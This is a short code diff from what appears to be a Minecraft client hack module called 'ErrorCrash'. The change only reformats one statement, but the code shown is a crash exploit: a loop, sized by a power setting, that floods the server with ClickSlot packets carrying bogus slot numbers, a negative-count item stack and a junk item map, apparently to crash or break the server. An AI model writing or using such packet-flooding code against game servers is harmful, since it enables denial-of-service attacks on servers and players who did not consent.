@@ -46,7 +46,17 @@ public class ErrorCrash extends Module {
                 Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
                 ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                 for (int i = 0; i < pwr.getValue(); i++) {
-                    client.player.networkHandler.sendPacket(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), ripbozo));
+                    client.player.networkHandler.sendPacket(
+                        new ClickSlotC2SPacket(
+                            client.player.currentScreenHandler.syncId, 
+                            123344, 
+                            2957234, 
+                            2859623, 
+                            SlotActionType.PICKUP, 
+                            new ItemStack(Items.AIR, -1), 
+                            ripbozo
+                        )
+                    );
                 }
             }
 
